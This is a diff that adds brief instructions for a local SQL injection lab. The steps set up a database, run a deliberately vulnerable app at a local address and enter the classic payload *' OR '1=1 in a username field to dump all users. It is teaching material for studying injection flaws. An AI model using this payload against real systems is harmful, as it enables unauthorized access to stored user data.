@@ -1,0 +1,9 @@
+run createDB.sh if my.db does NOT exist
+run_sqli.sh
+#uses template/sqli.html
+#use something like burp suite or just a normal browser
+browse to http://0.0.0.0:5000/
+set username to *' OR '1=1
+#this will inject
+# user?name=*'+OR+'1=1
+# and perform the sql injection attack to return all users in database
